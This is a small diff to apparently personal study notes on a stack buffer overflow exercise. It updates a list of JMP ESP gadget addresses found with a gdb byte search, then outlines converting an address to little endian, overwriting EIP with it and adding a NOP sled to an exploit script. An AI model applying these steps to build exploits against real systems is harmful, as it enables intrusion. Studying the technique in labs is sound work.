@@ -395,10 +395,12 @@ find JMP ESP
 - find /b 0xf7de1000,0xffffe000,0xff,0xe4
 - copy first five addresses into your notes
  
-0xf7f6674b
-0xf7f72753
-0xf7f72c6b
-0xf7f72df7    
+0xf7defb59
+0xf7f648ab
+0xf7f705fb
+0xf7f7060f
+0xf7f70aeb
+    
     
 - break it up and convert to little endian to make it easier 0xf7de3b59 --> f7 de 3b 59 > "\x59\x3b\xde\xf7"
 - go back to your script --> new eip, make it equal to the little endian above --> make nop in the script, nop = "\x90" * 15 --> declare them in the print statement
